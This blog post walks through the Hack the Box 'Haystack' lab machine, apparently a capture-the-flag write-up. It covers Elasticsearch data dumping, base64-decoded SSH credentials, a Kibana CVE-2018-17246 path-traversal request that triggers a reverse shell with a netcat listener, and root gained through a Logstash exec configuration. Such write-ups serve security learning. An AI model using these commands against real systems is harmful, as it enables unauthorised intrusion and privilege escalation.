---
layout:     post
title:      HacktheBox - Personal 'Haystack' Walkthough 
title2:      Hack the Box - Haystack
date:       2019-11-02 08:00:00 -0400
summary:    HTB Haystack machine walkthrough. A particularly well designed ELK (Elasticsearch, Logstash, Kibana) based machine offering a chance to dig into the full logging stack.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb 
 - walkthrough
 - writeup
 - elasticsearch
 - kibana
 - logstash
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-haystack/infocard.PNG' | relative_url }}">
</p>

<p>Haystack is classified as an easy difficulty machine on HTB. An ELK (Elasticsearch, Logstash, Kibana) based machine it offered me a chance to dig into the logging technology. I thought this was machine was particularly well designed and allowed me to go from simply knowing what ELK is to going through each part of the stack and working through vulnerabilities for each component.</p>

<h1>Initial Recon</h1>

<p>As usual, let's start with an nmap enumartion to see what we are working with.</p>

{% highlight shell %}
nmap -sV -sT -sC 10.10.10.115
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-05 19:27 EDT
Nmap scan report for 10.10.10.115
Host is up (0.65s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
{% endhighlight %}

<p>Port 9200 seems interesting. It looks like it's a web-service of some kind so let's open it up and take a look.</p>

<p align="center">
<img src="{{ '/assets/htb-haystack/elasticsearch.PNG' | relative_url }}">
</p>

<p>Elasticsearch eh? Even have the version that is running. I'll table that for later if needed. I'll fully admit that while I knew what elasticsearch was I had absolutely no idea how to work with it prior to this engagement. After doing a bit searching around and getting the hang of some basics I was able to take get search and queries working. Discovered the quotes index and found some interesting information.</p>

<p align="center">
<img src="{{ '/assets/htb-haystack/elasticsearch-search.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>At this point I hit my first roadblock. I could surmise from <code>_id</code> that there was data I was not being shown with the query. After a bit more reading I believe it was related to the <code>max_score</code> and <code>score</code> attributes. A bit more beating my head against the queries and I took a step back. A quick search for "how to dump all data from elasticsearch" led me to a useful tool - <a href="https://github.com/taraslayshchuk/es2csv">es2csv</a>. After getting everything setup I fired it off and managed to dump 1254 entries. Wow! That's a lot more than what I originally found manually.</p>

{% highlight shell %}
es2csv -q '*' -u http://10.10.10.115:9200 -i '*' --debug -o es-output.csv
Using these indices: *.
Query[Lucene]: *.
Output field(s): _all.
Sorting by: .
Found 1254 results.
...
Run query [#########################################################] [1254/1254] [100%] [0:00:00] [Time: 0:00:00] [  1.4 Kidocs/s]
Write to csv [#####################################################] [1254/1254] [100%] [0:00:00] [Time: 0:00:00] [  9.9 Kilines/s]
{% endhighlight %}

<p>Digging through the output file I don't see much useful information. It definitely doesn't help I don't speak Spanish fluently and I didn't think that translating the entire dump would be part of the required steps.</p>

<p>Ok time to take another step back. During initial enumeration I did quickly take a look at port 80. All there was is a jpg and quick look at the source didn't turn anything up. Considering the box is called Haystack and the picture was ominously named <code>needle.jpg</code> I figured it warranted a closer look. Sure enough within 30 seconds I find something very interesting.</p>

<p align="center">
<img src="{{ '/assets/htb-haystack/needle.PNG' | relative_url }}">
</p>

<p>Which after a quick decode and google translate we get something that makes a little more sense.</p>

{% highlight shell %}
echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
la aguja en el pajar es "clave"

the needle in the haystack is "key"
{% endhighlight %}

<p>So the needle is "key" eh? After parsing through the csv dump grepping for various "key"-words, I ended up going more literal and it paid off.</p>

{% highlight shell %}
grep clave es-output.csv 
,,,,,,,,,,,,,,,,,,"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
,,,,,,,,,,,,,,,,,,Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg 

echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security 
{% endhighlight %}

<p>That's more like it. From earlier we saw that <code>ssh</code> was open so let's give it a try.</p>

{% highlight shell %}
ssh security@10.10.10.115
security@10.10.10.115's password: 
Last login: Sun Oct  6 14:54:31 2019 from 10.10.15.116
[security@haystack ~]$ id
uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[security@haystack ~]$ pwd
/home/security
[security@haystack ~]$ ls
user.txt
[security@haystack ~]$ cat user.txt 
04d18b*********************
{% endhighlight %}

<p>Alright user down!</p>

<h1>Root exploitation</h1>

<p>With our new access I took a poke around the box for the usual suspects. Unfortunately security had quite limited access on the host. I was able to see one interesting thing as far as listening ports.</p>

{% highlight shell %}
[-] Listening TCP:
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128          *:80                       *:*                  
LISTEN     0      128          *:9200                     *:*                  
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      128    127.0.0.1:5601                   *:*        
{% endhighlight %}

<p>Listening only on 127.0.0.1 seems intriguing as an avenue. Knowing that elasticsearch was installed on the box I searched around and it did not take much time to get to - <a href="https://www.elastic.co/guide/en/kibana/6.4/settings.html">this article</a>.

<blockquote>
The default settings configure Kibana to run on localhost:5601. To change the host or port number, or connect to Elasticsearch running on a different machine, you’ll need to update your kibana.yml file. You can also enable SSL and set a variety of other options. Finally, environment variables can be injected into configuration using ${MY_ENV_VAR} syntax.
</blockquote>

<p>We know the version from our initial enumeration. After attempting to glean some information from the port unsuccessfully I stumbled on to <a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a>. 

<blockquote>
Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.
</blockquote>

<p>We just happen to have 6.4.2 running, check, and we have access to the console api, double check. We get the reverse shell file over to <code>/tmp</code> where we have write permissions. With everything in place, we set up a listener and kick off the exploit.</p>

{% highlight shell %}
[security@haystack tmp]$ curl -XGET 'http://127.0.0.1:5601/api/console/api_server?s5602_version=@@SENSE_VERSION&apis=../../../../../../.../../../../../../../../tmp/pad.js'

----

$nc -lvp 1337
Listening on [0.0.0.0] (family 2, port 1337)
Connection from 10.10.10.115 41274 received!

which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'  
bash-4.2$ id
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
bash-4.2$ 
{% endhighlight %}

<p>User pivot, done. Now the question of the day - what do we have access to as kibana that we didn't as security. After several various dead ends I found something worth taking a deeper look.</p>

{% highlight shell %}
bash-4.2$ pwd
/etc/logstash/conf.d
bash-4.2$ ls -latr
ls -latr
total 16
drwxr-xr-x. 3 root   root   183 Jun 18 22:15 ..
-rw-r-----. 1 root   kibana 131 Jun 20 10:59 filter.conf
-rw-r-----. 1 root   kibana 186 Jun 24 08:12 input.conf
-rw-r-----. 1 root   kibana 109 Jun 24 08:12 output.conf
drwxrwxr-x. 2 root   kibana  72 Oct  6 15:35 .
-rw-r--r--. 1 kibana kibana 102 Oct  6 15:35 ok
bash-4.2$ cat filter.conf	
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
bash-4.2$ cat input.conf	
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
bash-4.2$ cat output.conf	
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
{% endhighlight %}

<p>By itself this wasn't that meaningful, however the <code>type => "execute"</code> is where they got me interested. I followed through and looked at <code>/opt/kibana</code> to see how deep the hole went.</p>

{% highlight shell %}
bash-4.2$ pwd
/opt/kibana
bash-4.2$ ls -l
ls -l
total 8
-rwxrwxrwx. 1 kibana kibana 33 Oct  6 14:56 logstash_aa
-rw-r--r--. 1 kibana kibana 33 Oct  6 14:56 logstash_python_shell
bash-4.2$ cat logstash_python_shell
Ejecutar comando: /tmp/pshell.py
{% endhighlight %}

<p>Ok so it looks like it is pointing to script and based on my understanding at this point it seems like it would be executed. Very, very interesting. After spending some time reading <a href="https://www.elastic.co/guide/en/logstash/6.4/config-examples.html">this Logstash reference</a> I started understanding how it all worked together.<p>

<p>
    <ul>
    <li>Based on input.conf - logstash checks <code>/opt/kibana</code> every 10 seconds for files starting with <code>logstash_*</code></li>
    <li>Based on filter.conf - if the contents of these logstash_* files match the Grok filter of <i>"Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}"</i> then...</li>
    <li>Based on output.conf - execute the command that was supplied as <code>comando</code></li>
    </ul>
</p>

<p>With this understanding let's add our reverse shell to <code>/tmp</code> and create our own <code>logstash_</code> entry in <code>/opt/kibana</code> and setup the listener locally.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Haystack# nc -lvp 11337
Listening on [0.0.0.0] (family 2, port 11337)
Connection from 10.10.10.115 57164 received!
sh: no hay control de trabajos en este shell
sh-4.2# id
uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0
sh-4.2# cat /root/root.txt
3f5f72***********************
{% endhighlight %}

<p>And with that Haystask is in the books.</p>

<p>Thanks folks. Until next time.</p>